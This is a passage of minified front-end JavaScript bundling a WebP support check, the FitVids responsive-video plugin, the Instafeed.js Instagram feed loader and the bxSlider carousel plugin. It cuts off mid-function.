i.onerror=function(){w[t]=!1,W()},i.onload=function(){w[t]=1===i.width,W()},i.src="data:image/webp;base64,UklGRkoAAABXRUJQVlA4WAoAAAAQAAAAAAAAAAAAQUxQSAwAAAABBxAR/Q9ERP8DAABWUDggGAAAADABAJ0BKgEAAQADADQlpAADcAD++/1QAA==","pending"}("image/webp"))}(window,document),function(e){"use strict";e.fn.fitVids=function(t){var s={customSelector:null,ignore:null};if(!document.getElementById("fit-vids-style")){var i=document.head||document.getElementsByTagName("head")[0],n=document.createElement("div");n.innerHTML='<p>x</p><style id="fit-vids-style">.fluid-width-video-wrapper{width:100%;position:relative;padding:0;}.fluid-width-video-wrapper iframe,.fluid-width-video-wrapper object,.fluid-width-video-wrapper embed {position:absolute;top:0;left:0;width:100%;height:100%;}</style>',i.appendChild(n.childNodes[1])}return t&&e.extend(s,t),this.each((function(){var t=['iframe[src*="player.vimeo.com"]','iframe[src*="youtube.com"]','iframe[src*="youtube-nocookie.com"]','iframe[src*="kickstarter.com"][src*="video.html"]',"object","embed"];s.customSelector&&t.push(s.customSelector);var i=".fitvidsignore";s.ignore&&(i=i+", "+s.ignore);var n=e(this).find(t.join(","));(n=(n=n.not("object object")).not(i)).each((function(){var t=e(this);if(!(t.parents(i).length>0||"embed"===this.tagName.toLowerCase()&&t.parent("object").length||t.parent(".fluid-width-video-wrapper").length)){t.css("height")||t.css("width")||!isNaN(t.attr("height"))&&!isNaN(t.attr("width"))||(t.attr("height",9),t.attr("width",16));var s=("object"===this.tagName.toLowerCase()||t.attr("height")&&!isNaN(parseInt(t.attr("height"),10))?parseInt(t.attr("height"),10):t.height())/(isNaN(parseInt(t.attr("width"),10))?t.width():parseInt(t.attr("width"),10));if(!t.attr("name")){var n="fitvid"+e.fn.fitVids._count;t.attr("name",n),e.fn.fitVids._count++}t.wrap('<div class="fluid-width-video-wrapper"></div>').parent(".fluid-width-video-wrapper").css("padding-top",100*s+"%"),t.removeAttr("height").removeAttr("width")}}))}))},e.fn.fitVids._count=0}(window.jQuery||window.Zepto),function(){var e;e=function(){function e(e,t){var s,i;if(this.options={target:"instafeed",get:"popular",resolution:"thumbnail",sortBy:"none",links:!0,mock:!1,useHttp:!1},"object"==typeof e)for(s in e)i=e[s],this.options[s]=i;this.context=null!=t?t:this,this.unique=this._genKey()}return e.prototype.hasNext=function(){return"string"==typeof this.context.nextUrl&&this.context.nextUrl.length>0},e.prototype.next=function(){return!!this.hasNext()&&this.run(this.context.nextUrl)},e.prototype.run=function(t){var s,i;if("string"!=typeof this.options.clientId&&"string"!=typeof this.options.accessToken)throw new Error("Missing clientId or accessToken.");if("string"!=typeof this.options.accessToken&&"string"!=typeof this.options.clientId)throw new Error("Missing clientId or accessToken.");return null!=this.options.before&&"function"==typeof this.options.before&&this.options.before.call(this),"undefined"!=typeof document&&null!==document&&((i=document.createElement("script")).id="instafeed-fetcher",i.src=t||this._buildUrl(),document.getElementsByTagName("head")[0].appendChild(i),s="instafeedCache"+this.unique,window[s]=new e(this.options,this),window[s].unique=this.unique),!0},e.prototype.parse=function(e){var t,s,i,n,o,a,r,l,c,h,d,p,u,f,m,g,v,w,x,C,E,b,y,k,S,T,A,j;if("object"!=typeof e){if(null!=this.options.error&&"function"==typeof this.options.error)return this.options.error.call(this,"Invalid JSON data"),!1;throw new Error("Invalid JSON response")}if(200!==e.meta.code){if(null!=this.options.error&&"function"==typeof this.options.error)return this.options.error.call(this,e.meta.error_message),!1;throw new Error("Error from Instagram: "+e.meta.error_message)}if(0===e.data.length){if(null!=this.options.error&&"function"==typeof this.options.error)return this.options.error.call(this,"No images were returned from Instagram"),!1;throw new Error("No images were returned from Instagram")}if(null!=this.options.success&&"function"==typeof this.options.success&&this.options.success.call(this,e),this.context.nextUrl="",null!=e.pagination&&(this.context.nextUrl=e.pagination.next_url),"none"!==this.options.sortBy)switch(T="random"===this.options.sortBy?["","random"]:this.options.sortBy.split("-"),S="least"===T[0],T[1]){case"random":e.data.sort((function(){return.5-Math.random()}));break;case"recent":e.data=this._sortBy(e.data,"created_time",S);break;case"liked":e.data=this._sortBy(e.data,"likes.count",S);break;case"commented":e.data=this._sortBy(e.data,"comments.count",S);break;default:throw new Error("Invalid option for sortBy: '"+this.options.sortBy+"'.")}if("undefined"!=typeof document&&null!==document&&!1===this.options.mock){if(p=e.data,k=parseInt(this.options.limit,10),null!=this.options.limit&&p.length>k&&(p=p.slice(0,k)),a=document.createDocumentFragment(),null!=this.options.filter&&"function"==typeof this.options.filter&&(p=this._filter(p,this.options.filter)),null!=this.options.template&&"string"==typeof this.options.template){for(r="","",j=document.createElement("div"),l=0,C=p.length;l<C;l++){if("object"!=typeof(h=(c=p[l]).images[this.options.resolution]))throw o="No image found for resolution: "+this.options.resolution+".",new Error(o);m="square",(g=h.width)>(f=h.height)&&(m="landscape"),g<f&&(m="portrait"),d=h.url,window.location.protocol.indexOf("http")>=0&&!this.options.useHttp&&(d=d.replace(/https?:\/\//,"//")),r+=this._makeTemplate(this.options.template,{model:c,id:c.id,link:c.link,type:c.type,image:d,width:g,height:f,orientation:m,caption:this._getObjectProperty(c,"caption.text"),likes:c.likes.count,comments:c.comments.count,location:this._getObjectProperty(c,"location.name")})}for(j.innerHTML=r,n=[],i=0,s=j.childNodes.length;i<s;)n.push(j.childNodes[i]),i+=1;for(w=0,E=n.length;w<E;w++)y=n[w],a.appendChild(y)}else for(x=0,b=p.length;x<b;x++){if(c=p[x],u=document.createElement("img"),"object"!=typeof(h=c.images[this.options.resolution]))throw o="No image found for resolution: "+this.options.resolution+".",new Error(o);d=h.url,window.location.protocol.indexOf("http")>=0&&!this.options.useHttp&&(d=d.replace(/https?:\/\//,"//")),u.src=d,!0===this.options.links?((t=document.createElement("a")).href=c.link,t.appendChild(u),a.appendChild(t)):a.appendChild(u)}if("string"==typeof(A=this.options.target)&&(A=document.getElementById(A)),null==A)throw o='No element with id="'+this.options.target+'" on page.',new Error(o);A.appendChild(a),document.getElementsByTagName("head")[0].removeChild(document.getElementById("instafeed-fetcher")),v="instafeedCache"+this.unique,window[v]=void 0;try{delete window[v]}catch(e){}}return null!=this.options.after&&"function"==typeof this.options.after&&this.options.after.call(this),!0},e.prototype._buildUrl=function(){var e,t;switch("https://api.instagram.com/v1",this.options.get){case"popular":e="media/popular";break;case"tagged":if(!this.options.tagName)throw new Error("No tag name specified. Use the 'tagName' option.");e="tags/"+this.options.tagName+"/media/recent";break;case"location":if(!this.options.locationId)throw new Error("No location specified. Use the 'locationId' option.");e="locations/"+this.options.locationId+"/media/recent";break;case"user":if(!this.options.userId)throw new Error("No user specified. Use the 'userId' option.");e="users/"+this.options.userId+"/media/recent";break;default:throw new Error("Invalid option for get: '"+this.options.get+"'.")}return t="https://api.instagram.com/v1/"+e,null!=this.options.accessToken?t+="?access_token="+this.options.accessToken:t+="?client_id="+this.options.clientId,null!=this.options.limit&&(t+="&count="+this.options.limit),t+"&callback=instafeedCache"+this.unique+".parse"},e.prototype._genKey=function(){var e;return""+(e=function(){return(65536*(1+Math.random())|0).toString(16).substring(1)})()+e()+e()+e()},e.prototype._makeTemplate=function(e,t){var s,i,n,o,a;for(i=/(?:\{{2})([\w\[\]\.]+)(?:\}{2})/,s=e;i.test(s);)o=s.match(i)[1],a=null!=(n=this._getObjectProperty(t,o))?n:"",s=s.replace(i,(function(){return""+a}));return s},e.prototype._getObjectProperty=function(e,t){var s,i;for(i=(t=t.replace(/\[(\w+)\]/g,".$1")).split(".");i.length;){if(s=i.shift(),null==e||!(s in e))return null;e=e[s]}return e},e.prototype._sortBy=function(e,t,s){var i;return i=function(e,i){var n,o;return n=this._getObjectProperty(e,t),o=this._getObjectProperty(i,t),s?n>o?1:-1:n<o?1:-1},e.sort(i.bind(this)),e},e.prototype._filter=function(e,t){var s,i,n,o;for(s=[],i=function(e){if(t(e))return s.push(e)},n=0,o=e.length;n<o;n++)i(e[n]);return s},e}(),function(e,t){"function"==typeof define&&define.amd?define([],t):"object"==typeof module&&module.exports?module.exports=t():e.Instafeed=t()}(this,(function(){return e}))}.call(this),function(e){var t={mode:"horizontal",slideSelector:"",infiniteLoop:!0,hideControlOnEnd:!1,speed:500,easing:null,slideMargin:0,startSlide:0,randomStart:!1,captions:!1,ticker:!1,tickerHover:!1,adaptiveHeight:!1,adaptiveHeightSpeed:500,video:!1,useCSS:!0,preloadImages:"visible",responsive:!0,slideZIndex:50,wrapperClass:"bx-wrapper",touchEnabled:!0,swipeThreshold:50,oneToOneTouch:!0,preventDefaultSwipeX:!0,preventDefaultSwipeY:!1,ariaLive:!0,ariaHidden:!0,keyboardEnabled:!1,pager:!0,pagerType:"full",pagerShortSeparator:" / ",pagerSelector:null,buildPager:null,pagerCustom:null,controls:!0,nextText:"Next",prevText:"Prev",nextSelector:null,prevSelector:null,autoControls:!1,startText:"Start",stopText:"Stop",autoControlsCombine:!1,autoControlsSelector:null,auto:!1,pause:4e3,autoStart:!0,autoDirection:"next",stopAutoOnClick:!1,autoHover:!1,autoDelay:0,autoSlideForOnePage:!1,minSlides:1,maxSlides:1,moveSlides:0,slideWidth:0,shrinkItems:!1,onSliderLoad:function(){return!0},onSlideBefore:function(){return!0},onSlideAfter:function(){return!0},onSlideNext:function(){return!0},onSlidePrev:function(){return!0},onSliderResize:function(){return!0},onAutoChange:function(){return!0}};e.fn.bxSlider=function(s){if(0===this.length)return this;if(this.length>1)return this.each((function(){e(this).bxSlider(s)})),this;var n={},o=this,a=e(window).width(),r=e(window).height();if(!e(o).data("bxSlider")){var l=function(){e(o).data("bxSlider")||(n.settings=e.extend({},t,s),n.settings.slideWidth=parseInt(n.settings.slideWidth),n.children=o.children(n.settings.slideSelector),n.children.length<n.settings.minSlides&&(n.settings.minSlides=n.children.length),n.children.length<n.settings.maxSlides&&(n.settings.maxSlides=n.children.length),n.settings.randomStart&&(n.settings.startSlide=Math.floor(Math.random()*n.children.length)),n.active={index:n.settings.startSlide},n.carousel=n.settings.minSlides>1||n.settings.maxSlides>1,n.carousel&&(n.settings.preloadImages="all"),n.minThreshold=n.settings.minSlides*n.settings.slideWidth+(n.settings.minSlides-1)*n.settings.slideMargin,n.maxThreshold=n.settings.maxSlides*n.settings.slideWidth+(n.settings.maxSlides-1)*n.settings.slideMargin,n.working=!1,n.controls={},n.interval=null,n.animProp="vertical"===n.settings.mode?"top":"left",n.usingCSS=n.settings.useCSS&&"fade"!==n.settings.mode&&function(){for(var e=document.createElement("div"),t=["WebkitPerspective","MozPerspective","OPerspective","msPerspective"],s=0;s<t.length;s++)if(void 0!==e.style[t[s]])return n.cssPrefix=t[s].replace("Perspective","").toLowerCase(),n.animProp="-"+n.cssPrefix+"-transform",!0;return!1}(),"vertical"===n.settings.mode&&(n.settings.maxSlides=n.settings.minSlides),o.data("origStyle",o.attr("style")),o.children(n.settings.slideSelector).each((function(){e(this).data("origStyle",e(this).attr("style"))})),c())},c=function(){var t=n.children.eq(n.settings.startSlide);o.wrap('<div class="'+n.settings.wrapperClass+'"><div class="bx-viewport"></div></div>'),n.viewport=o.parent(),n.settings.ariaLive&&!n.settings.ticker&&n.viewport.attr("aria-live","polite"),n.loader=e('<div class="bx-loading" />'),n.viewport.prepend(n.loader),o.css({width:"horizontal"===n.settings.mode?1e3*n.children.length+215+"%":"auto",position:"relative"}),n.usingCSS&&n.settings.easing?o.css("-"+n.cssPrefix+"-transition-timing-function",n.settings.easing):n.settings.easing||(n.settings.easing="swing"),n.viewport.css({width:"100%",overflow:"hidden",position:"relative"}),n.viewport.parent().css({maxWidth:u()}),n.children.css({float:"horizontal"===n.settings.mode?"left":"none",listStyle:"none",position:"relative"}),n.children.css("width",f()),"horizontal"===n.settings.mode&&n.settings.slideMargin>0&&n.children.css("marginRight",n.settings.slideMargin),"vertical"===n.settings.mode&&n.settings.slideMargin>0&&n.children.css("marginBottom",n.settings.slideMargin),"fade"===n.settings.mode&&(n.children.css({position:"absolute",zIndex:0,display:"none"}),n.children.eq(n.settings.startSlide).css({zIndex:n.settings.slideZIndex,display:"block"})),n.controls.el=e('<div class="bx-controls" />'),n.settings.captions&&k(),n.active.last=n.settings.startSlide===g()-1,n.settings.video&&o.fitVids(),"none"===n.settings.preloadImages?t=null:("all"===n.settings.preloadImages||n.settings.ticker)&&(t=n.children),n.settings.ticker?n.settings.pager=!1:(n.settings.controls&&b(),n.settings.auto&&n.settings.autoControls&&y(),n.settings.pager&&E(),(n.settings.controls||n.settings.autoControls||n.settings.pager)&&n.viewport.after(n.controls.el)),null===t?d():h(t,d)},h=function(t,s){var i=t.find('img:not([src=""]), iframe').length,n=0;0!==i?t.find('img:not([src=""]), iframe').each((function(){e(this).one("load error",(function(){++n===i&&s()})).each((function(){(this.complete||""==this.src)&&e(this).trigger("load")}))})):s()},d=function(){if(n.settings.infiniteLoop&&"fade"!==n.settings.mode&&!n.settings.ticker){var t="vertical"===n.settings.mode?n.settings.minSlides:n.settings.maxSlides,s=n.children.slice(0,t).clone(!0).addClass("bx-clone"),i=n.children.slice(-t).clone(!0).addClass("bx-clone");n.settings.ariaHidden&&(s.attr("aria-hidden",!0),i.attr("aria-hidden",!0)),o.append(s).prepend(i)}n.loader.remove(),w(),"vertical"===n.settings.mode&&(n.settings.adaptiveHeight=!0),n.viewport.height(p()),o.redrawSlider(),n.settings.onSliderLoad.call(o,n.active.index),n.initialized=!0,n.settings.responsive&&e(window).on("resize",q),n.settings.auto&&n.settings.autoStart&&(g()>1||n.settings.autoSlideForOnePage)&&O(),n.settings.ticker&&z(),n.settings.pager&&I(n.settings.startSlide),n.settings.controls&&P(),n.settings.touchEnabled&&!n.settings.ticker&&R(),n.settings.keyboardEnabled&&!n.settings.ticker&&e(document).keydown(N)},p=function(){var t=0,s=e();if("vertical"===n.settings.mode||n.settings.adaptiveHeight)if(n.carousel){var o=1===n.settings.moveSlides?n.active.index:n.active.index*v();for(s=n.children.eq(o),i=1;i<=n.settings.maxSlides-1;i++)s=o+i>=n.children.length?s.add(n.children.eq(i-1)):s.add(n.children.eq(o+i))}else s=n.children.eq(n.active.index);else s=n.children;return"vertical"===n.settings.mode?(s.each((function(){t+=e(this).outerHeight()})),n.settings.slideMargin>0&&(t+=n.settings.slideMargin*(n.settings.minSlides-1))):t=Math.max.apply(Math,s.map((function(){return e(this).outerHeight(!1)})).get()),"border-box"===n.viewport.css("box-sizing")?t+=parseFloat(n.viewport.css("padding-top"))+parseFloat(n.viewport.css("padding-bottom"))+parseFloat(n.viewport.css("border-top-width"))+parseFloat(n.viewport.css("border-bottom-width")):"padding-box"===n.viewport.css("box-sizing")&&(t+=parseFloat(n.viewport.css("padding-top"))+parseFloat(n.viewport.css("padding-bottom"))),t},u=function(){var e="100%";return n.settings.slideWidth>0&&(e="horizontal"===n.settings.mode?n.settings.maxSlides*n.settings.slideWidth+(n.settings.maxSlides-1)*n.settings.slideMargin:n.settings.slideWidth),e},f=function(){var e=n.settings.slideWidth,t=n.viewport.width();if(0===n.settings.slideWidth||n.settings.slideWidth>t&&!n.carousel||"vertical"===n.settings.mode)e=t;else if(n.settings.maxSlides>1&&"horizontal"===n.settings.mode){if(t>n.maxThreshold)return e;t<n.minThreshold?e=(t-n.settings.slideMargin*(n.settings.minSlides-1))/n.settings.minSlides:n.settings.shrinkItems&&(e=Math.floor((t+n.settings.slideMargin)/Math.ceil((t+n.settings.slideMargin)/(e+n.settings.slideMargin))-n.settings.slideMargin))}return e},m=function(){var e=1,t=null;return"horizontal"===n.settings.mode&&n.settings.slideWidth>0?n.viewport.width()<n.minThreshold?e=n.settings.minSlides:n.viewport.width()>n.maxThreshold?e=n.settings.maxSlides:(t=n.children.first().width()+n.settings.slideMargin,e=Math.floor((n.viewport.width()+n.settings.slideMargin)/t)||1):"vertical"===n.settings.mode&&(e=n.settings.minSlides),e},g=function(){var e=0,t=0,s=0;if(n.settings.moveSlides>0){if(!n.settings.infiniteLoop){for(;t<n.children.length;)++e,t=s+m(),s+=n.settings.moveSlides<=m()?n.settings.moveSlides:m();return s}e=Math.ceil(n.children.length/v())}else e=Math.ceil(n.children.length/m());return e},v=function(){return n.settings.moveSlides>0&&n.settings.moveSlides<=m()?n.settings.moveSlides:m()},w=function(){var e,t,s;n.children.length>n.settings.maxSlides&&n.active.last&&!n.settings.infiniteLoop?"horizontal"===n.settings.mode?(e=(t=n.children.last()).position(),x(-(e.left-(n.viewport.width()-t.outerWidth())),"reset",0)):"vertical"===n.settings.mode&&(s=n.children.length-n.settings.minSlides,e=n.children.eq(s).position(),x(-e.top,"reset",0)):(e=n.children.eq(n.active.index*v()).position(),n.active.index===g()-1&&(n.active.last=!0),void 0!==e&&("horizontal"===n.settings.mode?x(-e.left,"reset",0):"vertical"===n.settings.mode&&x(-e.top,"reset",0)))},x=function(t,s,i,a){var r,l;n.usingCSS?(l="vertical"===n.settings.mode?"translate3d(0, "+t+"px, 0)":"translate3d("+t+"px, 0, 0)",o.css("-"+n.cssPrefix+"-transition-duration",i/1e3+"s"),"slide"===s?(o.css(n.animProp,l),0!==i?o.on("transitionend webkitTransitionEnd oTransitionEnd MSTransitionEnd",(function(t){e(t.target).is(o)&&(o.off("transitionend webkitTransitionEnd oTransitionEnd MSTransitionEnd"),H())})):H()):"reset"===s?o.css(n.animProp,l):"ticker"===s&&(o.css("-"+n.cssPrefix+"-transition-timing-function","linear"),o.css(n.animProp,l),0!==i?o.on("transitionend webkitTransitionEnd oTransitionEnd MSTransitionEnd",(function(t){e(t.target).is(o)&&(o.off("transitionend webkitTransitionEnd oTransitionEnd MSTransitionEnd"),x(a.resetValue,"reset",0),B())})):(x(a.resetValue,"reset",0),B()))):((r={})[n.animProp]=t,"slide"===s?o.animate(r,i,n.settings.easing,(function(){H()})):"reset"===s?o.css(n.animProp,t):"ticker"===s&&o.animate(r,i,"linear",(function(){x(a.resetValue,"reset",0),B()})))},C=function(){for(var t="",s="",i=g(),o=0;o<i;o++)s="",n.settings.buildPager&&e.isFunction(n.settings.buildPager)||n.settings.pagerCustom?(s=n.settings.buildPager(o),n.pagerEl.addClass("bx-custom-pager")):(s=o+1,n.pagerEl.addClass("bx-default-pager")),t+='<div class="bx-pager-item"><a href="" data-slide-index="'+o+'" class="bx-pager-link">'+s+"</a></div>";n.pagerEl.html(t)},E=function(){n.settings.pagerCustom?n.pagerEl=e(n.settings.pagerCustom):(n.pagerEl=e('<div class="bx-pager" />'),n.settings.pagerSelector?e(n.settings.pagerSelector).html(n.pagerEl):n.controls.el.addClass("bx-has-pager").append(n.pagerEl),C()),n.pagerEl.on("click touchend","a",D)},b=function(){n.controls.next=e('<a class="bx-next" href="">'+n.settings.nextText+"</a>"),n.controls.prev=e('<a class="bx-prev" href="">'+n.settings.prevText+"</a>"),n.controls.next.on("click touchend",S),n.controls.prev.on("click touchend",T),n.settings.nextSelector&&e(n.settings.nextSelector).append(n.controls.next),n.settings.prevSelector&&e(n.settings.prevSelector).append(n.controls.prev),n.settings.nextSelector||n.settings.prevSelector||(n.controls.directionEl=e('<div class="bx-controls-direction" />'),n.controls.directionEl.append(n.controls.prev).append(n.controls.next),n.controls.el.addClass("bx-has-controls-direction").append(n.controls.directionEl))},y=function(){n.controls.start=e('<div class="bx-controls-auto-item"><a class="bx-start" href="">'+n.settings.startText+"</a></div>"),n.controls.stop=e('<div class="bx-controls-auto-item"><a class="bx-stop" href="">'+n.settings.stopText+"</a></div>"),n.controls.autoEl=e('<div class="bx-controls-auto" />'),n.controls.autoEl.on("click",".bx-start",A),n.controls.autoEl.on("click",".bx-stop",j),n.settings.autoControlsCombine?n.controls.autoEl.append(n.controls.start):n.controls.autoEl.append(n.controls.start).append(n.controls.stop),n.settings.autoControlsSelector?e(n.settings.autoControlsSelector).html(n.controls.autoEl):n.controls.el.addClass("bx-has-controls-auto").append(n.controls.autoEl),M(n.settings.autoStart?"stop":"start")},k=function(){n.children.each((function(){var t=e(this).find("img:first").attr("title");void 0!==t&&(""+t).length&&e(this).append('<div class="bx-caption"><span>'+t+"</span></div>")}))},S=function(e){e.preventDefault(),n.controls.el.hasClass("disabled")||(n.settings.auto&&n.settings.stopAutoOnClick&&o.stopAuto(),o.goToNextSlide())},T=function(e){e.preventDefault(),n.controls.el.hasClass("disabled")||(n.settings.auto&&n.settings.stopAutoOnClick&&o.stopAuto(),o.goToPrevSlide())},A=function(e){o.startAuto(),e.preventDefault()},j=function(e){o.stopAuto(),e.preventDefault()},D=function(t){var s,i;t.preventDefault(),n.controls.el.hasClass("disabled")||(n.settings.auto&&n.settings.stopAutoOnClick&&o.stopAuto(),void 0!==(s=e(t.currentTarget)).attr("data-slide-index")&&(i=parseInt(s.attr("data-slide-index")))!==n.active.index&&o.goToSlide(i))},I=function(t){var s=n.children.length;if("short"===n.settings.pagerType)return n.settings.maxSlides>1&&(s=Math.ceil(n.children.length/n.settings.maxSlides)),void n.pagerEl.html(t+1+n.settings.pagerShortSeparator+s);n.pagerEl.find("a").removeClass("active"),n.pagerEl.each((function(s,i){e(i).find("a").eq(t).addClass("active")}))},H=function(){if(n.settings.infiniteLoop){var e="";0===n.active.index?e=n.children.eq(0).position():n.active.index===g()-1&&n.carousel?e=n.children.eq((g()-1)*v()).position():n.active.index===n.children.length-1&&(e=n.children.eq(n.children.length-1).position()),e&&("horizontal"===n.settings.mode?x(-e.left,"reset",0):"vertical"===n.settings.mode&&x(-e.top,"reset",0))}n.working=!1,n.settings.onSlideAfter.call(o,n.children.eq(n.active.index),n.oldIndex,n.active.index)},M=function(e){n.settings.autoControlsCombine?n.controls.autoEl.html(n.controls[e]):(n.controls.autoEl.find("a").removeClass("active"),n.controls.autoEl.find("a:not(.bx-"+e+")").addClass("active"))},P=function(){1===g()?(n.controls.prev.addClass("disabled"),n.controls.next.addClass("disabled")):!n.settings.infiniteLoop&&n.settings.hideControlOnEnd&&(0===n.active.index?(n.controls.prev.addClass("disabled"),n.controls.next.removeClass("disabled")):n.active.index===g()-1?(n.controls.next.addClass("disabled"),n.controls.prev.removeClass("disabled")):(n.controls.prev.removeClass("disabled"),n.controls.next.removeClass("disabled")))},$=function(){o.startAuto()},F=function(){o.stopAuto()},O=function(){n.settings.autoDelay>0?setTimeout(o.startAuto,n.settings.autoDelay):(o.startAuto(),e(window).focus($).blur(F)),n.settings.autoHover&&o.hover((function(){n.interval&&(o.stopAuto(!0),n.autoPaused=!0)}),(function(){n.autoPaused&&(o.startAuto(!0),n.autoPaused=null)}))},z=function(){var t,s,i,a,r,l,c,h,d=0;"next"===n.settings.autoDirection?o.append(n.children.clone().addClass("bx-clone")):(o.prepend(n.children.clone().addClass("bx-clone")),t=n.children.first().position(),d="horizontal"===n.settings.mode?-t.left:-t.top),x(d,"reset",0),n.settings.pager=!1,n.settings.controls=!1,n.settings.autoControls=!1,n.settings.tickerHover&&(n.usingCSS?(a="horizontal"===n.settings.mode?4:5,n.viewport.hover((function(){s=o.css("-"+n.cssPrefix+"-transform"),i=parseFloat(s.split(",")[a]),x(i,"reset",0)}),(function(){h=0,n.children.each((function(){h+="horizontal"===n.settings.mode?e(this).outerWidth(!0):e(this).outerHeight(!0)})),r=n.settings.speed/h,l="horizontal"===n.settings.mode?"left":"top",c=r*(h-Math.abs(parseInt(i))),B(c)}))):n.viewport.hover((function(){o.stop()}),(function(){h=0,n.children.each((function(){h+="horizontal"===n.settings.mode?e(this).outerWidth(!0):e(this).outerHeight(!0)})),r=n.settings.speed/h,l="horizontal"===n.settings.mode?"left":"top",c=r*(h-Math.abs(parseInt(o.css(l)))),B(c)}))),B()},B=function(e){var t,s,i=e||n.settings.speed,a={left:0,top:0},r={left:0,top:0};"next"===n.settings.autoDirection?a=o.find(".bx-clone").first().position():r=n.children.first().position(),t="horizontal"===n.settings.mode?-a.left:-a.top,s="horizontal"===n.settings.mode?-r.left:-r.top,x(t,"ticker",i,{resetValue:s})},N=function(t){var s=document.activeElement.tagName.toLowerCase();if(null==new RegExp(s,["i"]).exec("input|textarea")&&function(t){var s=e(window),i={top:s.scrollTop(),left:s.scrollLeft()},n=t.offset();return i.right=i.left+s.width(),i.bottom=i.top+s.height(),n.right=n.left+t.outerWidth(),n.bottom=n.top+t.outerHeight(),!(i.right<n.left||i.left>n.right||i.bottom<n.top||i.top>n.bottom)}(o)){if(39===t.keyCode)return S(t),!1;if(37===t.keyCode)return T(t),!1}},R=function(){n.touch={start:{x:0,y:0},end:{x:0,y:0}},n.viewport.on("touchstart MSPointerDown pointerdown",L),n.viewport.on("click",".bxslider a",(function(e){n.viewport.hasClass("click-disabled")&&(e.preventDefault(),n.viewport.removeClass("click-disabled"))}))},L=function(e){if("touchstart"===e.type||0===e.button)if(e.preventDefault(),n.controls.el.addClass("disabled"),n.working)n.controls.el.removeClass("disabled");else{n.touch.originalPos=o.position();var t=e.originalEvent,s=void 0!==t.changedTouches?t.changedTouches:[t];if("function"==typeof PointerEvent&&void 0===t.pointerId)return;n.touch.start.x=s[0].pageX,n.touch.start.y=s[0].pageY,n.viewport.get(0).setPointerCapture&&(n.pointerId=t.pointerId,n.viewport.get(0).setPointerCapture(n.pointerId)),n.originalClickTarget=t.originalTarget||t.target,n.originalClickButton=t.button,n.originalClickButtons=t.buttons,n.originalEventType=t.type,n.hasMove=!1,n.viewport.on("touchmove MSPointerMove pointermove",_),n.viewport.on("touchend MSPointerUp pointerup",W),n.viewport.on("MSPointerCancel pointercancel",V)}},V=function(e){e.preventDefault(),x(n.touch.originalPos.left,"reset",0),n.controls.el.removeClass("disabled"),n.viewport.off("MSPointerCancel pointercancel",V),n.viewport.off("touchmove MSPointerMove pointermove",_),n.viewport.off("touchend MSPointerUp pointerup",W),n.viewport.get(0).releasePointerCapture&&n.viewport.get(0).releasePointerCapture(n.pointerId)},_=function(e){var t=e.originalEvent,s=void 0!==t.changedTouches?t.changedTouches:[t],i=Math.abs(s[0].pageX-n.touch.start.x),o=Math.abs(s[0].pageY-n.touch.start.y),a=0,r=0;n.hasMove=!0,(3*i>o&&n.settings.preventDefaultSwipeX||3*o>i&&n.settings.preventDefaultSwipeY)&&e.preventDefault(),"touchmove"!==e.type&&e.preventDefault(),"fade"!==n.settings.mode&&n.settings.oneToOneTouch&&("horizontal"===n.settings.mode?(r=s[0].pageX-n.touch.start.x,a=n.touch.originalPos.left+r):(r=s[0].pageY-n.touch.start.y,a=n.touch.originalPos.top+r),x(a,"reset",0))},W=function(t){t.preventDefault(),n.viewport.off("touchmove MSPointerMove pointermove",_),n.controls.el.removeClass("disabled");var s=t.originalEvent,i=void 0!==s.changedTouches?s.changedTouches:[s],a=0,r=0;n.touch.end.x=i[0].pageX,n.touch.end.y=i[0].pageY,"fade"===n.settings.mode?(r=Math.abs(n.touch.start.x-n.touch.end.x))>=n.settings.swipeThreshold&&(n.touch.start.x>n.touch.end.x?o.goToNextSlide():o.goToPrevSlide(),o.stopAuto()):("horizontal"===n.settings.mode?(r=n.touch.end.x-n.touch.start.x,a=n.touch.originalPos.left):(r=n.touch.end.y-n.touch.start.y,a=n.touch.originalPos.top),!n.settings.infiniteLoop&&(0===n.active.index&&r>0||n.active.last&&r<0)?x(a,"reset",200):Math.abs(r)>=n.settings.swipeThreshold?(r<0?o.goToNextSlide():o.goToPrevSlide(),o.stopAuto()):x(a,"reset",200)),n.viewport.off("touchend MSPointerUp pointerup",W),n.viewport.get(0).releasePointerCapture&&n.viewport.get(0).releasePointerCapture(n.pointerId),!1!==n.hasMove||0!==n.originalClickButton&&"touchstart"!==n.originalEventType||e(n.originalClickTarget).trigger({type:"click",button:n.originalClickButton,buttons:n.originalClickButtons})},q=function(){if(n.initialized)if(n.working)window.setTimeout(q,10);else{var t=e(window).width(),s=e(window).height();a===t&&r===s||(a=t,r=s,o.redrawSlider(),n.settings.onSliderResize.call(o,n.active.index))}},K=function(e){var t=m();n.settings.ariaHidden&&!n.settings.ticker&&(n.children.attr("aria-hidden","true"),n.children.slice(e,e+t).attr("aria-hidden","false"))};return o.goToSlide=function(t,s){var i,a,r,l,c=!0,h=0,d={left:0,top:0},u=null;if(n.oldIndex=n.active.index,n.active.index=function(e){return e<0?n.settings.infiniteLoop?g()-1:n.active.index:e>=g()?n.settings.infiniteLoop?0:n.active.index:e}(t),!n.working&&n.active.index!==n.oldIndex){if(n.working=!0,void 0!==(c=n.settings.onSlideBefore.call(o,n.children.eq(n.active.index),n.oldIndex,n.active.index))&&!c)return n.active.index=n.oldIndex,void(n.working=!1);"next"===s?n.settings.onSlideNext.call(o,n.children.eq(n.active.index),n.oldIndex,n.active.index)||(c=!1):"prev"===s&&(n.settings.onSlidePrev.call(o,n.children.eq(n.active.index),n.oldIndex,n.active.index)||(c=!1)),n.active.last=n.active.index>=g()-1,(n.settings.pager||n.settings.pagerCustom)&&I(n.active.index),n.settings.controls&&P(),"fade"===n.settings.mode?(n.settings.adaptiveHeight&&n.viewport.height()!==p()&&n.viewport.animate({height:p()},n.settings.adaptiveHeightSpeed),n.children.filter(":visible").fadeOut(n.settings.speed).css({zIndex:0}),n.children.eq(n.active.index).css("zIndex",n.settings.slideZIndex+1).fadeIn(n.settings.speed,(function(){e(this).css("zIndex",n.settings.slideZIndex),H()}))):(n.settings.adaptiveHeight&&n.viewport.height()!==p()&&n.viewport.animate({height:p()},n.settings.adaptiveHeightSpeed),!n.settings.infiniteLoop&&n.carousel&&n.active.last?"horizontal"===n.settings.mode?(d=(u=n.children.eq(n.children.length-1)).position(),h=n.viewport.width()-u.outerWidth()):(i=n.children.length-n.settings.minSlides,d=n.children.eq(i).position()):n.carousel&&n.active.last&&"prev"===s?(a=1===n.settings.moveSlides?n.settings.maxSlides-v():(g()-1)*v()-(n.children.length-n.settings.maxSlides),d=(u=o.children(".bx-clone").eq(a)).position()):"next"===s&&0===n.active.index?(d=o.find("